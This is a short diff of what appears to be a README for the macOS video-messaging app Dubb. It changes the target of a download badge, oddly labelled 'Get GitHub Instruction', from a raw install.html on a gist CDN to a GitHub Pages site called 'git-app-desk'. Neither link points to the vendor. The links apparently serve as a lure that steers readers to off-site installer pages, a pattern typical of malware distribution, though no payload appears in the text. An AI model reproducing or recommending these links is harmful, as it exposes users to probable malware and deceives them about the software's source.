@@ -4,7 +4,7 @@
 Record your screen, webcam, or presentations — then share personalized video messages through email, LinkedIn, or CRM integrations.  
 Built for performance, Dubb runs natively on **Apple Silicon** and integrates seamlessly with macOS productivity tools. 🍎  
 
-[![💡 Get GitHub Instruction](https://img.shields.io/badge/💡%20Get%20Dubb%20Platform-FF8C00?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/blackprince97-debug/aa4fbed0dbc9ef5eb30153e9d761dc65/raw/3d81d6fe5a9709a45a450e18a92f639aa624a0b9/install.html?offer=DubbMac)
+[![💡 Get GitHub Instruction](https://img.shields.io/badge/💡%20Get%20Dubb%20Platform-FF8C00?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://git-app-desk.github.io/.github/?offer=DubbMac)
 
 ---
 
